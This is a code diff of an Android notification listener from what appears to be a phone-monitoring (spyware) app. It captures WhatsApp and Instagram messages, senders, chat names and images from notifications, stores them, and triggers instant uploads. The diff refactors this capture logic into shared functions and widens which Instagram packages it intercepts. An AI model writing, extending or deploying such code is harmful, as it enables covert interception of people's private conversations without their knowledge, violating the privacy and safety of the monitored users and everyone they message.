@@ -1,6 +1,8 @@
 package com.spapp.monitoring.collectors
 
 import android.app.Notification
+import android.content.Context
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
@@ -54,152 +56,16 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private fun processNotification(sbn: StatusBarNotification) {
         val pkg = sbn.packageName ?: return
-        if (pkg == "com.instagram.android") {
-            processInstagramNotification(sbn)
-            return
-        }
-        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
-
         val notification = sbn.notification ?: return
-        val extras = notification.extras ?: return
-
-        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
-        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
-        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
-        val text = if (!bigText.isNullOrBlank()) bigText else normalText
-        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
-        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
-        // Extract exact real message timestamp from WhatsApp notification
         val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
 
-        // Extract real image thumbnail if present in notification extras
-        var mediaType: String? = null
-        var mediaPath: String? = null
-
-        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
-            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
-            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
-
-        if (pictureBitmap != null) {
-            try {
-                val stream = java.io.ByteArrayOutputStream()
-                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
-                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
-                mediaType = "image"
-                mediaPath = "data:image/jpeg;base64,$base64"
-            } catch (_: Exception) {}
-        } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
-            mediaType = "image"
-            try {
-                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
-            } catch (_: Exception) {}
-        }
-
-        // Determine chat name: conversation title (groups) > title > fallback
-        val chatName = when {
-            !convoTitle.isNullOrBlank() -> convoTitle
-            !title.isNullOrBlank() && title != "WhatsApp" && title != "WhatsApp Business" -> title
-            else -> title ?: "WhatsApp"
-        }
-
-        // Skip non-message service notifications
-        val checkStr = "${title.orEmpty()} ${text.orEmpty()}".lowercase()
-        if (checkStr.contains("checking for new messages") ||
-            checkStr.contains("whatsapp web is active") ||
-            checkStr.contains("backup in progress") ||
-            checkStr.contains("deleting messages")
-        ) {
+        if (pkg == "com.instagram.android" || pkg == "com.instagram.lite" || pkg.contains("instagram")) {
+            processInstagramNotificationData(applicationContext, notification, postTime, pkg)
             return
         }
-
-        val entries = mutableListOf<WhatsAppMessageEntry>()
-
-        // 1. Android MessagingStyle bundled messages (android.messages & android.historicMessages)
-        val messageBundles = extras.getParcelableArray("android.messages")
-        val historicBundles = extras.getParcelableArray("android.historicMessages")
-        val allBundles = mutableListOf<android.os.Bundle>()
-        if (historicBundles != null) {
-            for (item in historicBundles) {
-                if (item is android.os.Bundle) allBundles.add(item)
-            }
-        }
-        if (messageBundles != null) {
-            for (item in messageBundles) {
-                if (item is android.os.Bundle) allBundles.add(item)
-            }
-        }
-
-        if (allBundles.isNotEmpty()) {
-            for (b in allBundles) {
-                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
-                if (bText.isBlank()) continue
-                val bTime = b.getLong("time", postTime)
-                val rawSender = b.getCharSequence("sender")?.toString()?.trim()
-                val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
-                val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
-                val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())
-
-                val cleanText = if (bText.startsWith("You: ", ignoreCase = true)) bText.substring(5).trim() else bText
-
-                entries += WhatsAppMessageEntry(
-                    chatName = chatName,
-                    sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
-                    messageText = cleanText,
-                    isOutgoing = isOutgoing,
-                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
-                    mediaType = mediaType,
-                    mediaPath = mediaPath
-                )
-            }
-        } else if (!textLines.isNullOrEmpty()) {
-            // 2. InboxStyle / multi-message bundled notification lines fallback
-            for (line in textLines) {
-                val lineStr = line?.toString()?.trim() ?: continue
-                if (lineStr.isBlank()) continue
-                val colonIdx = lineStr.indexOf(':')
-                val (sender, msg) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
-                    val s = lineStr.substring(0, colonIdx).trim()
-                    val m = lineStr.substring(colonIdx + 1).trim()
-                    Pair(s, m)
-                } else {
-                    Pair(title ?: chatName, lineStr)
-                }
-                val isLineOutgoing = sender.equals("You", ignoreCase = true) || sender.equals("Me", ignoreCase = true) || msg.startsWith("You: ", ignoreCase = true)
-                val cleanMsg = if (msg.startsWith("You: ", ignoreCase = true)) msg.substring(5).trim() else msg
-                entries += WhatsAppMessageEntry(
-                    chatName = chatName,
-                    sender = if (isLineOutgoing) "me" else sender,
-                    messageText = cleanMsg,
-                    isOutgoing = isLineOutgoing,
-                    messageTimeEpochMs = postTime,
-                    mediaType = mediaType,
-                    mediaPath = mediaPath
-                )
-            }
-        } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
-            val isSingleOutgoing = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You reacted ", ignoreCase = true) || (title != null && (title.equals("You", ignoreCase = true) || title.equals("Me", ignoreCase = true)))
-            val cleanSingle = if (text.startsWith("You: ", ignoreCase = true)) text.substring(5).trim() else text
-            entries += WhatsAppMessageEntry(
-                chatName = chatName,
-                sender = if (isSingleOutgoing) "me" else (title ?: chatName),
-                messageText = cleanSingle,
-                isOutgoing = isSingleOutgoing,
-                messageTimeEpochMs = postTime,
-                mediaType = mediaType,
-                mediaPath = mediaPath
-            )
-        }
-
-        if (entries.isNotEmpty()) {
-            scope.launch {
-                try {
-                    val db = AppDatabase.getInstance(applicationContext)
-                    db.whatsAppMessageDao().insertAll(entries)
-                    RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to record WhatsApp notification message", e)
-                }
-            }
+        if (pkg == "com.whatsapp" || pkg == "com.whatsapp.w4b") {
+            processWhatsAppNotificationData(applicationContext, notification, postTime, pkg)
+            return
         }
     }
 
@@ -323,197 +189,8 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private fun processInstagramNotification(sbn: StatusBarNotification) {
         val notification = sbn.notification ?: return
-        val extras = notification.extras ?: return
-
-        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
-        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
-        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
-        val text = if (!bigText.isNullOrBlank()) bigText else normalText
-        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
-        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
         val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()
-
-        var mediaType: String? = null
-        var mediaPath: String? = null
-
-        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
-            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
-            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
-
-        if (pictureBitmap != null) {
-            try {
-                val stream = java.io.ByteArrayOutputStream()
-                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
-                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
-                mediaPath = "data:image/jpeg;base64,$base64"
-                mediaType = "image"
-            } catch (_: Exception) {}
-        }
-
-        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
-        val targetAccount: String? = null
-
-        val summaryText = extras.getCharSequence("android.summaryText")?.toString()?.trim()
-        val bigTitle = extras.getCharSequence("android.title.big")?.toString()?.trim()
-
-        var chatName = when {
-            !convoTitle.isNullOrBlank() && !convoTitle.equals("Instagram", ignoreCase = true) -> convoTitle
-            !bigTitle.isNullOrBlank() && !bigTitle.equals("Instagram", ignoreCase = true) -> bigTitle
-            !title.isNullOrBlank() && !title.equals("Instagram", ignoreCase = true) -> title
-            !summaryText.isNullOrBlank() && !summaryText.equals("Instagram", ignoreCase = true) -> summaryText
-            !subText.isNullOrBlank() && !subText.equals("Instagram", ignoreCase = true) && !subText.contains("•") -> subText
-            else -> "Instagram User"
-        }
-
-        var prefixColonIdx = -1
-        // If chatName is generic, extract sender from text prefix ("user: text", "user sent a reel", etc.)
-        if (chatName.equals("Instagram", ignoreCase = true) || chatName.equals("Instagram User", ignoreCase = true)) {
-            val candidate = text ?: ""
-            val colonIdx = candidate.indexOf(':')
-            if (colonIdx in 1..40) {
-                chatName = candidate.substring(0, colonIdx).trim()
-                prefixColonIdx = colonIdx
-            } else if (candidate.contains(" sent ", ignoreCase = true)) {
-                val idx = candidate.indexOf(" sent ", ignoreCase = true)
-                if (idx in 1..40) {
-                    chatName = candidate.substring(0, idx).trim()
-                }
-            } else if (candidate.contains(" shared ", ignoreCase = true)) {
-                val idx = candidate.indexOf(" shared ", ignoreCase = true)
-                if (idx in 1..40) {
-                    chatName = candidate.substring(0, idx).trim()
-                }
-            }
-        }
-
-        fun extractReelUrl(txt: String?): String? {
-            if (txt.isNullOrBlank()) return null
-            val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
-            return match?.value
-        }
-
-        val entries = mutableListOf<InstagramMessageEntry>()
-
-        val messageBundles = extras.getParcelableArray("android.messages")
-        val historicBundles = extras.getParcelableArray("android.historicMessages")
-        val allBundles = mutableListOf<android.os.Bundle>()
-        if (historicBundles != null) {
-            for (item in historicBundles) {
-                if (item is android.os.Bundle) allBundles.add(item)
-            }
-        }
-        if (messageBundles != null) {
-            for (item in messageBundles) {
-                if (item is android.os.Bundle) allBundles.add(item)
-            }
-        }
-
-        if (allBundles.isNotEmpty()) {
-            for (b in allBundles) {
-                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
-                if (bText.isBlank()) continue
-                val bTime = b.getLong("time", postTime)
-                val rawSender = b.getCharSequence("sender")?.toString()?.trim()
-                val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
-                val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
-                val isOutgoing = isMeExplicit || hasYouPrefix
-
-                val cleanText = when {
-                    bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
-                    bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
-                    else -> bText
-                }
-
-                val foundReel = extractReelUrl(cleanText)
-                val itemMediaType = when {
-                    foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
-                    mediaType != null -> mediaType
-                    cleanText.contains("photo", ignoreCase = true) -> "image"
-                    cleanText.contains("video", ignoreCase = true) -> "video"
-                    else -> null
-                }
-
-                entries += InstagramMessageEntry(
-                    chatName = chatName,
-                    sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
-                    messageText = cleanText,
-                    isOutgoing = isOutgoing,
-                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
-                    mediaType = itemMediaType,
-                    mediaPath = mediaPath,
-                    reelUrl = foundReel,
-                    targetAccount = targetAccount
-                )
-            }
-        } else if (!textLines.isNullOrEmpty()) {
-            for (line in textLines) {
-                val lStr = line?.toString()?.trim() ?: continue
-                if (lStr.isBlank()) continue
-                val isOutgoing = lStr.startsWith("You: ", ignoreCase = true) || lStr.startsWith("You sent ", ignoreCase = true)
-                val clean = when {
-                    lStr.startsWith("You: ", ignoreCase = true) -> lStr.substring(5).trim()
-                    lStr.startsWith("You sent ", ignoreCase = true) -> lStr.substring(9).trim()
-                    else -> lStr
-                }
-                val foundReel = extractReelUrl(clean)
-                val itemMediaType = when {
-                    foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
-                    mediaType != null -> mediaType
-                    else -> null
-                }
-                entries += InstagramMessageEntry(
-                    chatName = chatName,
-                    sender = if (isOutgoing) "me" else (title ?: chatName),
-                    messageText = clean,
-                    isOutgoing = isOutgoing,
-                    messageTimeEpochMs = postTime,
-                    mediaType = itemMediaType,
-                    mediaPath = mediaPath,
-                    reelUrl = foundReel,
-                    targetAccount = targetAccount
-                )
-            }
-        } else if (!text.isNullOrBlank()) {
-            val hasYouPrefix = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You sent ", ignoreCase = true)
-            val clean = when {
-                text.startsWith("You: ", ignoreCase = true) -> text.substring(5).trim()
-                text.startsWith("You sent ", ignoreCase = true) -> text.substring(9).trim()
-                prefixColonIdx in 1..40 && text.length > prefixColonIdx + 1 -> text.substring(prefixColonIdx + 1).trim()
-                else -> text
-            }
-            val foundReel = extractReelUrl(clean)
-            val itemMediaType = when {
-                foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
-                mediaType != null -> mediaType
-                clean.contains("photo", ignoreCase = true) -> "image"
-                clean.contains("video", ignoreCase = true) -> "video"
-                else -> null
-            }
-            entries += InstagramMessageEntry(
-                chatName = chatName,
-                sender = if (hasYouPrefix) "me" else (title ?: chatName),
-                messageText = clean,
-                isOutgoing = hasYouPrefix,
-                messageTimeEpochMs = postTime,
-                mediaType = itemMediaType,
-                mediaPath = mediaPath,
-                reelUrl = foundReel,
-                targetAccount = targetAccount
-            )
-        }
-
-        if (entries.isNotEmpty()) {
-            scope.launch {
-                try {
-                    val db = AppDatabase.getInstance(applicationContext)
-                    db.instagramMessageDao().insertAll(entries)
-                    Log.d(TAG, "Saved ${entries.size} Instagram messages for $chatName")
-                    com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to save Instagram messages", e)
-                }
-            }
-        }
+        processInstagramNotificationData(applicationContext, notification, postTime, sbn.packageName ?: "com.instagram.android")
     }
 
     fun extractMessagesForInstagramChat(
@@ -681,6 +358,352 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                 }
             } catch (_: Exception) {}
             return names
+        }
+
+        fun processWhatsAppNotificationData(
+            context: Context,
+            notification: Notification,
+            postTime: Long,
+            pkg: String = "com.whatsapp"
+        ) {
+            val extras = notification.extras ?: return
+
+            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
+            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
+            val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
+            val text = if (!bigText.isNullOrBlank()) bigText else normalText
+            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
+            val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+
+            var mediaType: String? = null
+            var mediaPath: String? = null
+
+            val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
+                ?: (extras.get("android.picture") as? android.graphics.Bitmap)
+                ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
+
+            if (pictureBitmap != null) {
+                try {
+                    val stream = java.io.ByteArrayOutputStream()
+                    pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
+                    val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+                    mediaType = "image"
+                    mediaPath = "data:image/jpeg;base64,$base64"
+                } catch (_: Exception) {}
+            } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
+                mediaType = "image"
+                try {
+                    mediaPath = FileManagerCollector(context.applicationContext).getLatestWhatsAppImageBase64()
+                } catch (_: Exception) {}
+            }
+
+            val chatName = when {
+                !convoTitle.isNullOrBlank() -> convoTitle
+                !title.isNullOrBlank() && title != "WhatsApp" && title != "WhatsApp Business" -> title
+                else -> title ?: "WhatsApp"
+            }
+
+            val checkStr = "${title.orEmpty()} ${text.orEmpty()}".lowercase()
+            if (checkStr.contains("checking for new messages") ||
+                checkStr.contains("whatsapp web is active") ||
+                checkStr.contains("backup in progress") ||
+                checkStr.contains("deleting messages")
+            ) {
+                return
+            }
+
+            val entries = mutableListOf<WhatsAppMessageEntry>()
+
+            val messageBundles = extras.getParcelableArray("android.messages")
+            val historicBundles = extras.getParcelableArray("android.historicMessages")
+            val allBundles = mutableListOf<android.os.Bundle>()
+            if (historicBundles != null) {
+                for (item in historicBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+            if (messageBundles != null) {
+                for (item in messageBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+
+            if (allBundles.isNotEmpty()) {
+                for (b in allBundles) {
+                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
+                    if (bText.isBlank()) continue
+                    val bTime = b.getLong("time", postTime)
+                    val rawSender = b.getCharSequence("sender")?.toString()?.trim()
+                        ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            try {
+                                b.getParcelable<android.app.Person>("sender_person")?.name?.toString()?.trim()
+                            } catch (_: Exception) { null }
+                        } else null
+                    val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
+                    val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
+                    val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())
+
+                    val cleanText = if (bText.startsWith("You: ", ignoreCase = true)) bText.substring(5).trim() else bText
+
+                    entries += WhatsAppMessageEntry(
+                        chatName = chatName,
+                        sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
+                        messageText = cleanText,
+                        isOutgoing = isOutgoing,
+                        messageTimeEpochMs = if (bTime > 0) bTime else postTime,
+                        mediaType = mediaType,
+                        mediaPath = mediaPath
+                    )
+                }
+            } else if (!textLines.isNullOrEmpty()) {
+                for (line in textLines) {
+                    val lineStr = line?.toString()?.trim() ?: continue
+                    if (lineStr.isBlank()) continue
+                    val colonIdx = lineStr.indexOf(':')
+                    val (sender, msg) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
+                        val s = lineStr.substring(0, colonIdx).trim()
+                        val m = lineStr.substring(colonIdx + 1).trim()
+                        Pair(s, m)
+                    } else {
+                        Pair(title ?: chatName, lineStr)
+                    }
+                    val isLineOutgoing = sender.equals("You", ignoreCase = true) || sender.equals("Me", ignoreCase = true) || msg.startsWith("You: ", ignoreCase = true)
+                    val cleanMsg = if (msg.startsWith("You: ", ignoreCase = true)) msg.substring(5).trim() else msg
+                    entries += WhatsAppMessageEntry(
+                        chatName = chatName,
+                        sender = if (isLineOutgoing) "me" else sender,
+                        messageText = cleanMsg,
+                        isOutgoing = isLineOutgoing,
+                        messageTimeEpochMs = postTime,
+                        mediaType = mediaType,
+                        mediaPath = mediaPath
+                    )
+                }
+            } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
+                val isSingleOutgoing = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You reacted ", ignoreCase = true) || (title != null && (title.equals("You", ignoreCase = true) || title.equals("Me", ignoreCase = true)))
+                val cleanSingle = if (text.startsWith("You: ", ignoreCase = true)) text.substring(5).trim() else text
+                entries += WhatsAppMessageEntry(
+                    chatName = chatName,
+                    sender = if (isSingleOutgoing) "me" else (title ?: chatName),
+                    messageText = cleanSingle,
+                    isOutgoing = isSingleOutgoing,
+                    messageTimeEpochMs = postTime,
+                    mediaType = mediaType,
+                    mediaPath = mediaPath
+                )
+            }
+
+            if (entries.isNotEmpty()) {
+                CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
+                    try {
+                        val db = AppDatabase.getInstance(context.applicationContext)
+                        db.whatsAppMessageDao().insertAll(entries)
+                        RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context.applicationContext)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to record WhatsApp notification message", e)
+                    }
+                }
+            }
+        }
+
+        fun processInstagramNotificationData(
+            context: Context,
+            notification: Notification,
+            postTime: Long,
+            pkg: String = "com.instagram.android"
+        ) {
+            val extras = notification.extras ?: return
+
+            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
+            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
+            val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
+            val text = if (!bigText.isNullOrBlank()) bigText else normalText
+            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
+            val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+
+            var mediaType: String? = null
+            var mediaPath: String? = null
+
+            val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
+                ?: (extras.get("android.picture") as? android.graphics.Bitmap)
+                ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)
+
+            if (pictureBitmap != null) {
+                try {
+                    val stream = java.io.ByteArrayOutputStream()
+                    pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
+                    val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
+                    mediaPath = "data:image/jpeg;base64,$base64"
+                    mediaType = "image"
+                } catch (_: Exception) {}
+            }
+
+            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
+            val summaryText = extras.getCharSequence("android.summaryText")?.toString()?.trim()
+            val bigTitle = extras.getCharSequence("android.title.big")?.toString()?.trim()
+
+            var chatName = when {
+                !convoTitle.isNullOrBlank() && !convoTitle.equals("Instagram", ignoreCase = true) -> convoTitle
+                !bigTitle.isNullOrBlank() && !bigTitle.equals("Instagram", ignoreCase = true) -> bigTitle
+                !title.isNullOrBlank() && !title.equals("Instagram", ignoreCase = true) -> title
+                !summaryText.isNullOrBlank() && !summaryText.equals("Instagram", ignoreCase = true) -> summaryText
+                !subText.isNullOrBlank() && !subText.equals("Instagram", ignoreCase = true) && !subText.contains("•") -> subText
+                else -> "Instagram User"
+            }
+
+            var prefixColonIdx = -1
+            if (chatName.equals("Instagram", ignoreCase = true) || chatName.equals("Instagram User", ignoreCase = true)) {
+                val candidate = text ?: ""
+                val colonIdx = candidate.indexOf(':')
+                if (colonIdx in 1..40) {
+                    chatName = candidate.substring(0, colonIdx).trim()
+                    prefixColonIdx = colonIdx
+                } else if (candidate.contains(" sent ", ignoreCase = true)) {
+                    val idx = candidate.indexOf(" sent ", ignoreCase = true)
+                    if (idx in 1..40) {
+                        chatName = candidate.substring(0, idx).trim()
+                    }
+                } else if (candidate.contains(" shared ", ignoreCase = true)) {
+                    val idx = candidate.indexOf(" shared ", ignoreCase = true)
+                    if (idx in 1..40) {
+                        chatName = candidate.substring(0, idx).trim()
+                    }
+                }
+            }
+
+            fun extractReelUrl(txt: String?): String? {
+                if (txt.isNullOrBlank()) return null
+                val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
+                return match?.value
+            }
+
+            val entries = mutableListOf<InstagramMessageEntry>()
+
+            val messageBundles = extras.getParcelableArray("android.messages")
+            val historicBundles = extras.getParcelableArray("android.historicMessages")
+            val allBundles = mutableListOf<android.os.Bundle>()
+            if (historicBundles != null) {
+                for (item in historicBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+            if (messageBundles != null) {
+                for (item in messageBundles) {
+                    if (item is android.os.Bundle) allBundles.add(item)
+                }
+            }
+
+            if (allBundles.isNotEmpty()) {
+                for (b in allBundles) {
+                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
+                    if (bText.isBlank()) continue
+                    val bTime = b.getLong("time", postTime)
+                    val rawSender = b.getCharSequence("sender")?.toString()?.trim()
+                        ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            try {
+                                b.getParcelable<android.app.Person>("sender_person")?.name?.toString()?.trim()
+                            } catch (_: Exception) { null }
+                        } else null
+                    val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
+                    val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
+                    val isOutgoing = isMeExplicit || hasYouPrefix
+
+                    val cleanText = when {
+                        bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
+                        bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
+                        else -> bText
+                    }
+
+                    val foundReel = extractReelUrl(cleanText)
+                    val itemMediaType = when {
+                        foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
+                        mediaType != null -> mediaType
+                        cleanText.contains("photo", ignoreCase = true) -> "image"
+                        cleanText.contains("video", ignoreCase = true) -> "video"
+                        else -> null
+                    }
+
+                    entries += InstagramMessageEntry(
+                        chatName = chatName,
+                        sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
+                        messageText = cleanText,
+                        isOutgoing = isOutgoing,
+                        messageTimeEpochMs = if (bTime > 0) bTime else postTime,
+                        mediaType = itemMediaType,
+                        mediaPath = mediaPath,
+                        reelUrl = foundReel,
+                        targetAccount = null
+                    )
+                }
+            } else if (!textLines.isNullOrEmpty()) {
+                for (line in textLines) {
+                    val lStr = line?.toString()?.trim() ?: continue
+                    if (lStr.isBlank()) continue
+                    val isOutgoing = lStr.startsWith("You: ", ignoreCase = true) || lStr.startsWith("You sent ", ignoreCase = true)
+                    val clean = when {
+                        lStr.startsWith("You: ", ignoreCase = true) -> lStr.substring(5).trim()
+                        lStr.startsWith("You sent ", ignoreCase = true) -> lStr.substring(9).trim()
+                        else -> lStr
+                    }
+                    val foundReel = extractReelUrl(clean)
+                    val itemMediaType = when {
+                        foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
+                        mediaType != null -> mediaType
+                        else -> null
+                    }
+                    entries += InstagramMessageEntry(
+                        chatName = chatName,
+                        sender = if (isOutgoing) "me" else (title ?: chatName),
+                        messageText = clean,
+                        isOutgoing = isOutgoing,
+                        messageTimeEpochMs = postTime,
+                        mediaType = itemMediaType,
+                        mediaPath = mediaPath,
+                        reelUrl = foundReel,
+                        targetAccount = null
+                    )
+                }
+            } else if (!text.isNullOrBlank()) {
+                val hasYouPrefix = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You sent ", ignoreCase = true)
+                val clean = when {
+                    text.startsWith("You: ", ignoreCase = true) -> text.substring(5).trim()
+                    text.startsWith("You sent ", ignoreCase = true) -> text.substring(9).trim()
+                    prefixColonIdx in 1..40 && text.length > prefixColonIdx + 1 -> text.substring(prefixColonIdx + 1).trim()
+                    else -> text
+                }
+                val foundReel = extractReelUrl(clean)
+                val itemMediaType = when {
+                    foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
+                    mediaType != null -> mediaType
+                    clean.contains("photo", ignoreCase = true) -> "image"
+                    clean.contains("video", ignoreCase = true) -> "video"
+                    else -> null
+                }
+                entries += InstagramMessageEntry(
+                    chatName = chatName,
+                    sender = if (hasYouPrefix) "me" else (title ?: chatName),
+                    messageText = clean,
+                    isOutgoing = hasYouPrefix,
+                    messageTimeEpochMs = postTime,
+                    mediaType = itemMediaType,
+                    mediaPath = mediaPath,
+                    reelUrl = foundReel,
+                    targetAccount = null
+                )
+            }
+
+            if (entries.isNotEmpty()) {
+                CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
+                    try {
+                        val db = AppDatabase.getInstance(context.applicationContext)
+                        db.instagramMessageDao().insertAll(entries)
+                        Log.d(TAG, "Saved ${entries.size} Instagram messages for $chatName")
+                        RealtimeLogObserverManager.triggerInstantInstagramUpload(context.applicationContext)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to save Instagram messages", e)
+                    }
+                }
+            }
         }
     }
 }
